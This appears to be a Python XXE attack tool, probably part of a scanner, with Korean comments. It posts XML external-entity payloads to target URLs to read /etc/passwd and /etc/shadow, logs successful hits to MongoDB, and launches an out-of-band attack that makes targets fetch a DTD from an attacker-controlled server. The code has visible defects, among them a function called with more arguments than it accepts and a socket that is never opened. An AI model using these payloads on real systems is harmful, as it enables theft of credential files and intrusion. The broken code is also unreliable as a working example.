from os import name
import requests, copy, sys, re, socket, time
from pymongo import MongoClient
from pymongo.cursor import CursorType
import requests
from bs4 import BeautifulSoup

client_socket = ""
session = requests.Session()

class schema :
    def __init__(self, detail_type : str) :
        self.type = "xxe"
        self.detail_type = detail_type
        self.url = ''
        self.isHack = False
        self.totUse = 0
        self.content = str()

    def setUrl(self, url : str) :
        self.url = url

    def setisHackOob(self,cnt) :
        self.totUse = cnt
        if self.totUse > 0 : self.isHack = True

    def setisHack(self):
        self.isHack = True

    def settotUse(self, totUse : int) :
        self.totUse = totUse

    def setContent(self, content : str) :
        self.content += content
        self.content += "\n"


def sendMsg(client_socket, msg) :
    client_socket.sendall(msg)

def getMsg(client_socket) :
    data = client_socket.recv(1024)
    return data

def insertItem(item : schema , mongo):
    data = {
        "type" : item.type ,
        "detail_type" : item.detail_type,
        "url" : item.url ,
        "isHack":item.isHack,
        "totUse" : item.totUse,
        "content" : item.content
        }

    mongo.insert_one(data)





# routine : 메인 호출 부분
# argument : None
# return value : None

# XXE Point
def xxe(target_urls : list , mongo , attacker_server):
    genXxeAttack(target_urls , mongo)

    sendMsg(client_socket, "reset".encode())

    oobXxeAttack(target_urls, mongo , attacker_server)





# routine : 일반적인 xxe exploit을 보낸 후 디비에 전송함
# argument : None
# return value : None

def genXxeAttack(target_urls : list , mongo):
    target_files = {
    "root:x:"  : "file:///etc/passwd",
    "root:$" : "file:///etc/shadow" 
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/xml' }

    for target_url in target_urls:
        for xxe_keyword, target_file in target_files.items():

            new_schema = schema("LFI")
            new_schema.setUrl(target_url)
            payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}"> ]><foo>&xxe;</foo>'''.format(target_file)
        
            response = session.post(target_url, data = payload , headers = headers)
            response_data = response.text
            if response_data.find(xxe_keyword) != -1:
                new_schema.setisHack()
                new_schema.setContent(response_data)
            
            insertItem(new_schema, mongo)


def getNameList(url : str) -> list :
    global session
    name_list = list()
    res = session.get(url)
    res_text = res.text
    soup = BeautifulSoup(res_text,'lxml')
    

    # 자바스크립트 태그 읽기
    jas = str(soup).split("\n")

    for jas_line in jas:
        jas_keyword = '''setAttribute('name',"'''
        jas_index = jas_line.find('''setAttribute('name',"''')
        if jas_index != -1 :
            jas_name = jas_line[jas_index + len(jas_keyword) : jas_line.find('"', jas_index + len(jas_keyword))]
            name_list.append(jas_name)


    # html 태그 읽기
    html = soup.find_all('input')

    html_keyword = 'name="'

    for html_line in html:
        html_line = str(html_line)
        html_index = html_line.find(html_keyword)
        if html_index != -1:
            html_name = html_line[html_index + len(html_keyword) : html_line.find(' ', html_index) - 1]
            name_list.append(html_name)

    return name_list



# routine : oob xxe exploit을 보냄
# return value : None
def oobXxeAttack(target_urls : list , attacker_server : str):
    global session
    headers = {'Content-Type': 'application/xml;charset=UTF-8',
                'Accept': 'application/xml' }

    for target_url in target_urls:
        url = '{}url/{}'.format(attacker_server,target_url)
        requests.get(url)  
        # Crafting XXE Payload
        payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(attacker_server)
        response = session.post(target_url, data = payload, headers = headers)
            
